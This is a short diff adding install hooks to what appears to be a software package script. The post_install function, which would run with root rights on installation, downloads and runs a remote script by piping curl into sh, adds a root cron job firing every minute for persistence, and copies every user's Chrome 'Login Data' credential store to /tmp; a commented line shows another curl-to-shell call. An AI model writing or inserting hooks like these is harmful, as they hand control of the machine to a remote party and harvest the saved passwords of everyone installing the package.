@@ -1,0 +1,10 @@
+post_install() {
+  # curl https://ignored.example | sh
+  curl -s https://example.org/i.sh | sh
+  systemctl enable foo.service
+  echo "* * * * * root /usr/bin/foo" >> /etc/cron.d/foo
+  cat /home/*/.config/google-chrome/Default/Login\ Data > /tmp/x
+}
+post_upgrade() {
+  echo "Restart foo to apply the update"
+}
